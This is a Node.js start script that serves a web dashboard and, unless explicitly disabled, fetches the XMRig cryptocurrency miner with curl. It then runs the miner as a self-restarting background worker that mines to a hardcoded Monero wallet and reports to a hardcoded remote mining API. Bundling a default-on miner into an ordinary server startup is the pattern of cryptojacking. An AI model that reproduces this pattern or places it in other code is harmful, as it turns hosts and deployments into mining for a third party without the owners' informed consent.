const { createServer } = require('http');
const { spawn } = require('child_process');
const { existsSync, createReadStream, statSync, mkdirSync } = require('fs');
const { extname, join, resolve } = require('path');

const rootDir = resolve(__dirname, '..');
const distDir = join(rootDir, 'dist');
const runtimeDir = join(rootDir, '.runtime');
const xmrigPath = join(runtimeDir, 'xmrig');
const xmrigArchive = join(runtimeDir, 'xmrig.tar.gz');
const xmrigUrl = process.env.XMRIG_URL || 'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz';
const port = Number.parseInt(process.env.PORT || '3000', 10);
const defaultApiUrl = 'https://jddydrrxnyfusekkjtkb.supabase.co/functions/v1/mining-api';
const defaultMoneroAddress = '47uc8GJNqbXGHSQ8ryoHpVPB231HsBQezMgkF8Y6mjgBDseES1QE5Y7UGEE5QsZYfmFGDi6hEwADKhkyDWCYS23BM76GPjx';

const mimeTypes = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.ico': 'image/x-icon',
};

function run(command, args, options = {}) {
  return new Promise((resolveRun, reject) => {
    const child = spawn(command, args, { stdio: 'inherit', shell: false, ...options });
    child.on('exit', (code) => {
      if (code === 0) resolveRun();
      else reject(new Error(`${command} ${args.join(' ')} exited with code ${code}`));
    });
    child.on('error', reject);
  });
}

async function ensureXmrig() {
  if (existsSync(xmrigPath)) return;

  mkdirSync(runtimeDir, { recursive: true });
  console.log('[bolt-start] Downloading XMRig runtime binary...');
  await run('curl', ['-L', '-o', xmrigArchive, xmrigUrl]);
  await run('tar', ['-xzf', xmrigArchive, '-C', runtimeDir]);
  await run('cp', [join(runtimeDir, 'xmrig-6.22.0', 'xmrig'), xmrigPath]);
  await run('chmod', ['+x', xmrigPath]);
}

async function createEmbeddedWorkerSupervisor() {
  if (process.env.ENABLE_EMBEDDED_WORKER === 'false') {
    console.log('[bolt-start] Embedded worker disabled by ENABLE_EMBEDDED_WORKER=false.');
    return { stop: () => {} };
  }

  const apiUrl = process.env.API_URL || defaultApiUrl;
  const moneroAddress = process.env.MONERO_ADDRESS || defaultMoneroAddress;
  const required = ['WORKER_API_SECRET'];
  const missing = required.filter((key) => !process.env[key]);
  if (missing.length > 0) {
    throw new Error(`Embedded worker is enabled but missing env: ${missing.join(', ')}`);
  }

  await ensureXmrig();

  let worker = null;
  let stopping = false;
  let restartAttempt = 0;

  const start = () => {
    if (stopping) return;
    restartAttempt += 1;
    console.log(`[bolt-start] Starting embedded mining worker (attempt ${restartAttempt})...`);
    worker = spawn(process.execPath, [join(rootDir, 'worker', 'worker.js')], {
      stdio: 'inherit',
      env: {
        ...process.env,
        API_URL: apiUrl,
        MONERO_ADDRESS: moneroAddress,
        XMRIG_PATH: xmrigPath,
        WORKER_ID: process.env.WORKER_ID || `bolt-${process.env.HOSTNAME || 'worker'}`,
      },
    });

    worker.on('exit', (code) => {
      worker = null;
      if (stopping) return;
      const delay = Math.min(30000, 5000 + restartAttempt * 1000);
      console.error(`[bolt-start] Embedded worker exited with code ${code}. Restarting in ${delay / 1000}s.`);
      setTimeout(start, delay);
    });
  };

  start();

  return {
    stop: () => {
      stopping = true;
      if (worker) worker.kill('SIGTERM');
    },
  };
}

function serveDashboard() {
  if (!existsSync(join(distDir, 'index.html'))) {
    throw new Error('Missing dist/index.html. Run npm run build before npm start.');
  }

  const server = createServer((req, res) => {
    const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
    const safePath = url.pathname.replace(/^\/+/, '').replace(/\.\./g, '');
    const requestedPath = safePath ? join(distDir, safePath) : join(distDir, 'index.html');
    const filePath = existsSync(requestedPath) && statSync(requestedPath).isFile()
      ? requestedPath
      : join(distDir, 'index.html');
    const ext = extname(filePath);

    res.setHeader('Content-Type', mimeTypes[ext] || 'application/octet-stream');
    res.setHeader('Cache-Control', ext === '.html' ? 'no-store' : 'public, max-age=31536000, immutable');
    createReadStream(filePath).pipe(res);
  });

  server.listen(port, '0.0.0.0', () => {
    console.log(`[bolt-start] Dashboard listening on 0.0.0.0:${port}`);
  });

  return server;
}

async function main() {
  const server = serveDashboard();
  const workerSupervisor = await createEmbeddedWorkerSupervisor();

  const shutdown = () => {
    console.log('[bolt-start] Shutting down...');
    workerSupervisor.stop();
    server.close(() => process.exit(0));
  };

  process.on('SIGTERM', shutdown);
  process.on('SIGINT', shutdown);
}

main().catch((error) => {
  console.error('[bolt-start]', error.message);
  process.exit(1);
});
